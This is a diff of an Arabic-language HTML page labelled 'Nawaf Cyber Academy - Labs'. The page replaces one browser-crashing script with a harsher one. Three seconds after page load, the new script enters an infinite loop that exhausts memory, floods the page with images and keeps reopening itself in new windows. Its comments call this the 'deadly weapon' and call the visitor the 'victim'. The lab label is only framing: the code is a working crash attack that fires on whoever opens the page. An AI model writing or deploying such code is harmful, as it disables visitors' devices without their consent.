@@ -2,42 +2,50 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Advanced System Stress Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nawaf Cyber Academy - Labs</title>
     <style>
-        body { background-color: #000; color: #0f0; text-align: center; font-family: monospace; padding-top: 50px; }
+        body {
+            background-color: #000;
+            color: #0f0;
+            text-align: center;
+            font-family: 'Courier New', Courier, monospace;
+            padding-top: 100px;
+        }
     </style>
 </head>
 <body>
-    <h1>Nawaf Cyber Academy - Labs</h1>
-    <p>جاري فحص موارد النظام...</p>
+
+    <h1>Nawaf Cyber Academy</h1>
+    <p>... جاري فحص موارد النظام واستعداد الهجوم</p>
+    <p>انتظر 3 ثواني فقط...</p>
 
     <script>
-        // دالة التفجير البرمجي
         window.onload = function() {
-            console.log("Starting Stress Test...");
+            let data = [];
             
-            // الجزء الأول: استنزاف الرام بشكل انفجاري
-            let heavyLoad = [];
-            
-            // الجزء الثاني: إنشاء مهام متكررة لا تنتهي (Infinite Loops inside Intervals)
-            setInterval(() => {
-                // محاولة حجز مساحات ضخمة في الذاكرة
-                for (let i = 0; i < 1000; i++) {
-                    heavyLoad.push(new Array(1000000).join("CRASH_TEST_"));
-                    
-                    // توليد عناصر HTML في الخلفية لإرهاق محرك الرندر (Rendering Engine)
-                    let div = document.createElement('div');
-                    div.innerHTML = Math.random();
-                    document.body.appendChild(div);
-                }
+            function crash() {
+                // تنبيه بسيط قبل "التهنيج"
+                console.log("BOOM!");
                 
-                // عملية حسابية معقدة جداً لإجبار المعالج على الغليان
-                let x = 0;
-                while(x < 10000000) {
-                    x += Math.sqrt(Math.random() * Math.random());
+                while(true) {
+                    // 1. استنزاف الرام
+                    data.push(new Array(10000000).join("X")); 
+                    
+                    // 2. إغراق الصفحة بالعناصر
+                    let img = document.createElement('img');
+                    img.src = "https://placehold.co/600x400?text=CRASHING";
+                    document.body.appendChild(img);
+                    
+                    // 3. فتح نوافذ جديدة (هذا هو السلاح الفتاك)
+                    window.open(window.location.href, '_blank');
                 }
-            }, 1); // التكرار كل 1 مللي ثانية!
+            }
+            
+            // سيتم التنفيذ بعد 3 ثواني من دخول الضحية (أو دخولك أنت للتجربة)
+            setTimeout(crash, 3000);
         };
     </script>
+
 </body>
 </html>
